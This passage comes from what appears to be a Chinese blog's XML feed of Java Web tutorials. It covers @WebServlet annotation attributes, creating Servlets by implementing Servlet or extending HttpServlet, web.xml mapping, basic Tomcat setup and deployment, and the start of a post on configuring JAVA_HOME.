@WebServlet注解常用属性</h3><ul><li>name：Servlet名字（可选）。</li><li>value：配置URL路径，可以配置多个。</li><li>urlPatterns：配置URL路径，和value作用一样，但不能同时使用。</li><li>loadOnStartup：配置Servlet的创建的时机，如果是0或者是正整数，则启动程序时就创建；如果是负数，则访问时创建。当数为正整数时，数越小优先级越高。</li></ul><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.MyWeb;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot; , value = &#123;&quot;/hs&quot;,&quot;hss&quot;&#125; , loadOnStartup = 0)</span> <span class="hljs-comment">//urlPatterns = &#123;&quot;/hs&quot;,&quot;/hss&quot;&#125;</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;这是doGet&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;这是doPost&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>Servlet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十五）Servlet的创建方式</title>
    <link href="/2021/08/16/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%BA%94%EF%BC%89Servlet%E7%9A%84%E5%88%9B%E5%BB%BA%E6%96%B9%E5%BC%8F/"/>
    <url>/2021/08/16/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%BA%94%EF%BC%89Servlet%E7%9A%84%E5%88%9B%E5%BB%BA%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>Servlet（Server Applet）是Java Servlet的简称，称为小服务程序或服务连接器，用Java编写的服务器端程序，具有独立于平台和协议的特性，主要功能在于交互式地浏览和生成数据，生成动态Web内容。狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。从原理上讲，Servlet可以响应任何类型的请求，但绝大多数情况下Servlet只用来扩展基于HTTP协议的Web服务器。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Servlet核心接口和类"><a href="#1-Servlet核心接口和类" class="headerlink" title="1.Servlet核心接口和类"></a>1.Servlet核心接口和类</h2><blockquote><p>在Servlet体系结构中，除了实现Servlet接口，还可以通过继承GenericServlet或HttpServlet类。</p></blockquote><h3 id="1-1-Servlet接口"><a href="#1-1-Servlet接口" class="headerlink" title="1.1 Servlet接口"></a>1.1 Servlet接口</h3><p>在Servlet API 中最重要的是 Servlet 接口，所有Servlet都会直接或间接的与该接口发生联想，或是直接实现该接口，或间接继承实现了该接口的类。</p><blockquote><p>该接口包括五个方法：</p></blockquote><ul><li>public void init(ServletConfig servletConfig)</li><li>public ServletConfig getServletConfig()</li><li>public void service(ServletRequest servletRequest, ServletResponse servletResponse) </li><li>public String getServletInfo()</li><li>public void destroy()</li></ul><h3 id="1-2-GenericServlet抽象类"><a href="#1-2-GenericServlet抽象类" class="headerlink" title="1.2 GenericServlet抽象类"></a>1.2 GenericServlet抽象类</h3><p>GenericServlet 使编写 Servlet 变得更容易。它提供生命周期方法 init 和 destroy 的简单实现，要编写一般的Servlet，只需要重写抽象 service 方法即可。</p><h3 id="1-3-HttpServlet类"><a href="#1-3-HttpServlet类" class="headerlink" title="1.3 HttpServlet类"></a>1.3 HttpServlet类</h3><p>HttpServlet 是继承 GenericServlet 的基础上进一步的扩展。<br>提供将要被子类化以创建适用于Web站点的 HttpServlet的抽象类。HttpServlet的子类至少必须重写一个方法，该方法通常是以下这些方法之一：</p><ul><li>doGet：如果 servlet 支持 Http Get 请求。</li><li>doPost：用于 Http Post 请求。</li><li>doPut：用于 Http Put 请求。</li><li>doDelete：用于Http Delete 请求。</li></ul><h2 id="2-Servlet的创建方式"><a href="#2-Servlet的创建方式" class="headerlink" title="2.Servlet的创建方式"></a>2.Servlet的创建方式</h2><h3 id="2-1-实现接口Servlet"><a href="#2-1-实现接口Servlet" class="headerlink" title="2.1 实现接口Servlet"></a>2.1 实现接口Servlet</h3><p>基础版。需要基础接口中的所有方法。详见上一博文中。</p><h3 id="2-2-继承HttpServlet（推荐）"><a href="#2-2-继承HttpServlet（推荐）" class="headerlink" title="2.2 继承HttpServlet（推荐）"></a>2.2 继承HttpServlet（推荐）</h3><p>可以根据不同的请求方式来做不同的处理结果。也是开发中推荐使用的。<br>如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.MyWeb;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">super</span>.doGet(req, resp); <span class="hljs-comment">//这是调用的父类的doGet();</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">super</span>.doPost(req, resp); <span class="hljs-comment">//这是调用的父类的doPost();</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们可以根据需求自行更改。只需要删除调用父类的方法，再写上自己的代码即可。如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.MyWeb;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;这是doGet&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;这是doPost&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>Servlet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十四）初识Servlet</title>
    <link href="/2021/08/16/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89%E5%88%9D%E8%AF%86Servlet/"/>
    <url>/2021/08/16/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89%E5%88%9D%E8%AF%86Servlet/</url>
    
    <content type="html"><![CDATA[<p>Servlet（Server Applet）是Java Servlet的简称，称为小服务程序或服务连接器，用Java编写的服务器端程序，具有独立于平台和协议的特性，主要功能在于交互式地浏览和生成数据，生成动态Web内容。狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。从原理上讲，Servlet可以响应任何类型的请求，但绝大多数情况下Servlet只用来扩展基于HTTP协议的Web服务器。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Servlet开发步骤"><a href="#1-Servlet开发步骤" class="headerlink" title="1.Servlet开发步骤"></a>1.Servlet开发步骤</h2><h3 id="1-1-搭建环境"><a href="#1-1-搭建环境" class="headerlink" title="1.1 搭建环境"></a>1.1 搭建环境</h3><p>将Servlet相关的 jar 包（lib\servlet-api.jar）配置到 <code>CLASSPATH中</code>。如：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">F:\ideaTool\apache-tomcat-9.0.52\lib\servlet-api.jar;<br></code></pre></div></td></tr></table></figure><p>按照以上形式根据自己的安装路径配置到CLASSPATH中。</p><h3 id="1-2-编写Servlet"><a href="#1-2-编写Servlet" class="headerlink" title="1.2 编写Servlet"></a>1.2 编写Servlet</h3><ul><li>实现 javax.servlet.Servlet。</li><li>需要重新5个主要方法。</li><li>在核心方法 service() 中编写语句。</li></ul><p>主要使用的包：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.Servlet;<br><span class="hljs-keyword">import</span> javax.servlet.ServletConfig;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.ServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">//===================================</span><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br></code></pre></div></td></tr></table></figure><h2 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h2><h3 id="2-1-编写Servlet"><a href="#2-1-编写Servlet" class="headerlink" title="2.1 编写Servlet"></a>2.1 编写Servlet</h3><p>建立一个名为MyServlet的txt文本文件，重写五个主要方法，如以下代码，并将后缀改为java。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//MyServlet.java</span><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyServlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Servlet</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title">getServletConfig</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello Servlet!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getServletInfo</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>再对上面的java文件进行编译，在命令窗口中输入：<code>javac MyServlet.java</code><br>生成 MyServlet.class 文件。再将class文件放到myweb项目下的WEB-INF目录下的classes目录中。</p><h3 id="2-2-配置Servlet"><a href="#2-2-配置Servlet" class="headerlink" title="2.2 配置Servlet"></a>2.2 配置Servlet</h3><p>在myweb项目中，配置其web.xml文件。如下：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><br><span class="hljs-tag"><span class="hljs-string">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>my<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span> <span class="hljs-comment">&lt;!--任意取一个别名--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>MyServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span> <span class="hljs-comment">&lt;!--对哪个类进行描述，这里是对MyServlet.class作描述，如果有包名，则需要写全限定名--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>my<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span> <span class="hljs-comment">&lt;!--映射的哪一个servlet。所以需要和上面的servlet的名字一样--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/myservlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span> <span class="hljs-comment">&lt;!--用来访问的路径--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>&lt;servlet-mapping&gt; 是对 &lt;servlet&gt; 作映射的。映射关系为：<br>用户通过访问 url-pattern ，然后通过 servlet-mapping 中的 servlet-name 映射到 servlet 中的 servlet-name ，然后才知道描述的是 servlet-class 。</p><p>即：&lt;url-pattern&gt; -&gt;  &lt;servlet-mapping&gt; 中的 &lt;servlet-name&gt; -&gt; &lt;servlet&gt; 中的 &lt;servlet-name&gt; -&gt; &lt;servlet-class&gt; 。</p><p>url-pattern配置的内容就是浏览器地址栏输入的URL中<code>项目名称后的资源的名称</code>。</p><p>配置好Servlet后，再启动Tomcat，再在浏览器中输入：<a href="http://localhost:8080/myweb/myservlet">http://localhost:8080/myweb/myservlet</a> 。然后可以在控制台黑窗口上（不是网页中）看见 Hello Servlet! 。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单来说部署项目和访问项目就几步。</p><blockquote><ol><li>在webapps目录下新建项目文件夹。</li></ol></blockquote><blockquote><ol start="2"><li>将ROOT项目中的WEB-INF文件夹复制到新建项目文件夹下。</li></ol></blockquote><blockquote><ol start="3"><li>将要用的 .class 文件放到classes文件目录下（没有则手动创建）。</li></ol></blockquote><blockquote><ol start="4"><li>配置web.xml。无非就两个东西：&lt;servlet&gt; ，&lt;servlet-mapping&gt;</li></ol></blockquote><blockquote><ol start="5"><li>启动Tomcat访问URL。</li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>Servlet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十三）Tomcat的基本使用</title>
    <link href="/2021/08/16/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89Tomcat%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/08/16/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89Tomcat%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。目前比较流行的Web 应用服务器。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Tomcat目录"><a href="#1-Tomcat目录" class="headerlink" title="1.Tomcat目录"></a>1.Tomcat目录</h2><table><thead><tr><th align="center">文件夹</th><th align="center">说明</th><th align="left">备注</th></tr></thead><tbody><tr><td align="center">bin</td><td align="center">该目录下存放的是二进制可执行文件</td><td align="left">startup.bat用来启动Tomcat、shutdown.bat用来停止Tomcat</td></tr><tr><td align="center">conf</td><td align="center">非常重要的目录，最为重要的server.xml和web.xml</td><td align="left">server.xml：配置整个服务器信息。例如修改端口号，编码格式等。<br/>web.xml：项目部署描述符文件，这个文件中注册了很多MIME类型，即文档类型。</td></tr><tr><td align="center">lib</td><td align="center">Tomcat的类库，存放Tomcat运行所需要的 jar 文件。</td><td align="left"></td></tr><tr><td align="center">logs</td><td align="center">存放日志文件，记录Tomcat启动和关闭的信息，如果启动Tomcat时有错误、异常也会记录在日志文件中。</td><td align="left"></td></tr><tr><td align="center">temp</td><td align="center">Tomcat的临时文件，这个目录下的东西在停止Tomcat后删除。</td><td align="left"></td></tr><tr><td align="center">webapps</td><td align="center">存放web项目的目录，其中每个文件夹都是一个项目；其中ROOT是一个特殊的项目，当在地址栏中没有给出项目目录时，对应的就是ROOT项目。</td><td align="left"></td></tr><tr><td align="center">work</td><td align="center">运行时生成的文件，最终运行的文件都在这里。</td><td align="left">当客户端用户访问一个JSP文件时，Tomcat会通过JSP生成JAVA文件，然后再编译JAVA文件生成class文件，生成的java和class文件都会存放到这个目录下。</td></tr></tbody></table><h2 id="2-Tomcat启动、关闭"><a href="#2-Tomcat启动、关闭" class="headerlink" title="2.Tomcat启动、关闭"></a>2.Tomcat启动、关闭</h2><p>进入Tomcat安装目录的bin目录下，双击startup.bat即可启动Tomcat。如果双击后，黑窗口一闪而过，这种情况一般是JAVA_HOME没有配置好，可以参考 <a href="">启动Tomcat黑窗口一闪而过</a>。<br>关闭Tomcat，只需要双击同目录下的shutdown.bat即可。</p><h2 id="3-Tomcat访问"><a href="#3-Tomcat访问" class="headerlink" title="3.Tomcat访问"></a>3.Tomcat访问</h2><p>在浏览器中，输入 <a href="http://localhost:8080/">http://localhost:8080</a> 。</p><h2 id="4-Tomcat修改端口"><a href="#4-Tomcat修改端口" class="headerlink" title="4.Tomcat修改端口"></a>4.Tomcat修改端口</h2><p>Tomcat默认端口号为 8080 ，可以通过conf/server.xml 文件修改端口号。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;Connector port=<span class="hljs-string">&quot;8080&quot;</span> protocol=<span class="hljs-string">&quot;HTTP/1.1&quot;</span><br>               connectionTimeout=<span class="hljs-string">&quot;20000&quot;</span><br>               redirectPort=<span class="hljs-string">&quot;8443&quot;</span> /&gt;<br></code></pre></div></td></tr></table></figure><p><strong>修改端口号后需要重启Tomcat才能生效。</strong></p><h2 id="5-Tomcat项目部署和访问"><a href="#5-Tomcat项目部署和访问" class="headerlink" title="5.Tomcat项目部署和访问"></a>5.Tomcat项目部署和访问</h2><p>Tomcat是WEB服务器，项目需要部署在 webapps 目录下，然后通过特定的 URL 访问。</p><h3 id="5-1-创建项目"><a href="#5-1-创建项目" class="headerlink" title="5.1 创建项目"></a>5.1 创建项目</h3><blockquote><ol><li>在 webapps 目录下建立文件夹（项目），比如 myweb。</li></ol></blockquote><blockquote><ol start="2"><li>创建 WEB-INF 文件夹，用来存放项目的核心内容。在其目录下创建以下几个文件夹：</li></ol></blockquote><ul><li>创建classes：用来存放 .class 文件。</li><li>创建lib：用来存放 jar 文件。</li><li>创建web.xml：这是项目的配置文件。（可以到ROOT项目下，将其复制过来即可。）</li></ul><blockquote><ol start="3"><li>把网页hello.html放在myweb文件夹中，需要与WEB-INF在同一级目录。</li></ol></blockquote><h3 id="5-2-访问"><a href="#5-2-访问" class="headerlink" title="5.2 访问"></a>5.2 访问</h3><p>在浏览器地址中输入URL：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">http://localhost:8080/myweb/hello.html<br></code></pre></div></td></tr></table></figure><p>其中：</p><ul><li>http：是协议。</li><li>localhost：这里是域名或主机名。也可以写成127.0.0.1。</li><li>8080：是端口号</li><li>myweb/hello.html：是资源路径。</li></ul><p>所以，一般来说UR了主要有四部分组成：协议、主机、端口、资源路径。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>Tomcat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-批处理命令启动Tomcat黑窗口一闪而过</title>
    <link href="/2021/08/16/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-%E6%89%B9%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4%E5%90%AF%E5%8A%A8Tomcat%E9%BB%91%E7%AA%97%E5%8F%A3%E4%B8%80%E9%97%AA%E8%80%8C%E8%BF%87/"/>
    <url>/2021/08/16/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-%E6%89%B9%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4%E5%90%AF%E5%8A%A8Tomcat%E9%BB%91%E7%AA%97%E5%8F%A3%E4%B8%80%E9%97%AA%E8%80%8C%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>需要先下载 jdk。</p><h2 id="1-配置JAVA-HOME"><a href="#1-配置JAVA-HOME" class="headerlink" title="1.配置JAVA_HOME"></a>1.配置JAVA_HOME</h2><p>选择我的电脑 —&gt; 右键属性 —&gt; 选择高级系统设置 —&gt; 环境变量 —&gt; 在系统变量处选择新建，创建系统变量 <code>JAVA_HOME</code>，如下图所示，其中的变量值为JDK的安装位置（不是bin目录，而是bin的上一级目录），点击确定保存。</p><p><img src="https://img-blog.csdnimg.cn/0651addc6c644b11a1f40b832fd4aa04.png"></p><blockquote><p>配置JAVA_HOME作用：</p></blockquote><ul><li><p>方便引用，避免每次引用都很复杂。</p></li><li><p>归一原则，一处修改多处使用。</p></li><li><p>一般约定，有的第三方软件会默认引用JAVA_HOME</p></li></ul><h2 id="2-配置CLASSPATH"><a href="#2-配置CLASSPATH" class="headerlink" 